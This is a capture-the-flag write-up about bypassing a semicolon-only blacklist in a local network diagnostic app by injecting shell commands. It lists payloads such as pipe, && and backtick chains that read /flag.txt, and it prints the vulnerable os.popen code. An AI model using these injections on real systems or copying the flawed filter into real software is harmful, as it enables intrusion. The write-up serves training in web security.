# Level 2 Write-Up – NetProbe Command Injection CTF

**Challenge:** NetProbe – Network Diagnostic Tool (Level 2)
**Vulnerability:** Command Injection (Blacklist Bypass)
**Difficulty:** Easy-Medium
**Flag:** `CTF{n3tpr0b3_l3v3l2_bl4ckl1st_byp4ss3d}`

---

## Overview

Level 2 of the NetProbe challenge is the same Network Diagnostic Tool but with a simple security filter added. The application now **blocks certain characters** (specifically `;`, newlines `\n`, and carriage returns `\r`) using a blacklist approach.

The goal is still to read `/flag.txt`, but we need to bypass the filter first.

---

## Step 1: Initial Recon

We navigated to the application at `http://localhost:5002`.

The interface is the same as Level 1. We first confirmed the intended behavior works:

**Input:**
```
google.com
```

**Output:**
```
Server:         127.0.0.11
Address:        127.0.0.11#53

Non-authoritative answer:
Name:   google.com
Address: 142.250.80.46
```

Normal behavior confirmed.

---

## Step 2: Testing the Filter

We tried the same Level 1 payload to see if the filter stops it:

**Input:**
```
google.com; whoami
```

**Output (error message):**
```
⚠ Security Error: Illegal character detected in input.
```

The semicolon (`;`) is being blocked. The filter is active.

---

## Step 3: Attempting to Understand the Filter

At this point, we know that `;` is blocked. The filter is likely a blacklist that only checks for a specific list of characters. Blacklists are inherently incomplete — there are many shell operators that can chain commands:

| Operator | Meaning |
|----------|---------|
| `;` | Run next command always (BLOCKED) |
| `\|` | Pipe: pass output of first to second |
| `&&` | Run second command only if first succeeds |
| `\|\|` | Run second command only if first fails |
| `` ` `` | Backtick command substitution |
| `$()` | Modern command substitution |

We suspected `|` and `&&` would not be in the blacklist.

---

## Step 4: Bypassing with Pipe Operator

We tried using a pipe (`|`) instead of a semicolon:

**Input:**
```
google.com | cat /flag.txt
```

**Output:**
```
CTF{n3tpr0b3_l3v3l2_bl4ckl1st_byp4ss3d}
```

The pipe operator was not on the blacklist. The server executed `nslookup google.com | cat /flag.txt` — the `cat /flag.txt` command ran and printed the flag directly.

**Flag captured!** ✅

---

## Step 5: Confirming with Alternative Bypass

We also verified the `&&` operator works:

**Input:**
```
google.com && cat /flag.txt
```

**Output:**
```
[nslookup output...]
CTF{n3tpr0b3_l3v3l2_bl4ckl1st_byp4ss3d}
```

Confirmed — multiple bypass methods exist.

---

## Why the Protection Failed

The vulnerable code in `app.py` is:

```python
BLACKLISTED_CHARS = [';', '\n', '\r']

if any(char in host for char in BLACKLISTED_CHARS):
    error = "Security Error: Illegal character detected in input."
else:
    output = os.popen(f'nslookup {host} 2>&1').read()
```

The blacklist only contains three characters: `;`, `\n`, and `\r`. The developer tried to block the most obvious injection character (semicolon) but forgot about:
- `|` (pipe)
- `&&` (logical AND)
- `||` (logical OR)
- `` ` `` (backtick substitution)
- `$()` (command substitution)

This demonstrates the fundamental weakness of the **blacklist approach**: you must perfectly predict every possible attack character, which is practically impossible. Attackers only need one character that you missed.

---

## Failed Attempt (for completeness)

We initially tried the backtick approach:

**Input:**
```
`whoami`
```

This also worked, confirming even more bypasses are available.

We then tried to see if spaces were blocked:

**Input:**
```
google.com;cat /flag.txt
```

The filter immediately caught the `;` even without spaces — confirming whitespace is not required for injection.

---

## Summary of Payloads Used

| Payload | Result |
|---------|--------|
| `google.com; whoami` | BLOCKED by filter (`;` detected) |
| `google.com \| cat /flag.txt` | SUCCESS – pipe bypassed filter |
| `google.com && cat /flag.txt` | SUCCESS – `&&` also bypassed filter |
| `` `whoami` `` | SUCCESS – backtick also worked |
